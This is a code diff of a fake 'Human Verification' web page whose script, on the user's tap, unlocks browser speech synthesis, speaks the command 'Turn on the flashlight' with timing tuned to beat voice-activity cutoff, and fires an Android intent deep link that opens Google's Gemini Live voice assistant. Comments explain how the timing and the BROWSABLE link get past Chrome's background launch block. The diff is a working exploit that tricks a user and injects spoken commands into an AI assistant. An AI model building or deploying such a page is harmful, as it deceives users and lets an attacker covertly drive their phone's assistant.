@@ -48,36 +48,40 @@
 
     <div class="container">
         <h2>Human Verification</h2>
-        <p>Please tap anywhere on the screen to continue to the site.</p>
+        <p>Please tap anywhere on the screen to continue.</p>
         <button>Verify</button>
     </div>
 
     <script>
+        let exploited = false;
+
         document.getElementById('click-overlay').addEventListener('click', function() {
             if (exploited) return;
             exploited = true;
-        
-            // 1. Synchronously trigger the Intent
-            // Firing this IMMEDIATELY on the click event is the only way to 
-            // bypass Chrome's background launch block.
-            let intentUrl = "intent:#Intent;" +
-                "action=android.intent.action.VOICE_COMMAND;" +
-                "launchFlags=0x10000000;" + 
-                "end";
-            
-            window.location.href = intentUrl;
-        
-            // 2. Queue the Speech Payload
-            // We don't need a heavy timeout here. We speak just as the 
-            // transition happens.
+
+            // 1. Unlock the TTS engine with a silent utterance
+            let unlockUtterance = new SpeechSynthesisUtterance("");
+            window.speechSynthesis.speak(unlockUtterance);
+
+            // 2. Queue the payload with the tightened 500ms timing window
             setTimeout(function() {
                 let payload = new SpeechSynthesisUtterance("Turn on the flashlight");
                 payload.lang = "en-US";
-                payload.rate = 1.3; // Speed up slightly to stay in the 800ms window
+                // Speeding up the speech rate slightly to ensure it completes before VAD cutoff
+                payload.rate = 1.3; 
                 payload.volume = 1.0;
-                
                 window.speechSynthesis.speak(payload);
-            }, 400); // Reduced to 400ms for faster injection
+            }, 500); 
+
+            // 3. Fire the Intent using the BROWSABLE Gemini deep link
+            // Chrome allows this because it targets an HTTPS scheme tied to the Google App
+            let intentUrl = "intent://bard.google.com/android?target=live&min-version=1#Intent;" +
+                "scheme=https;" +
+                "package=com.google.android.googlequicksearchbox;" +
+                "action=android.intent.action.VIEW;" +
+                "end";
+            
+            window.location.href = intentUrl;
         });
     </script>
 
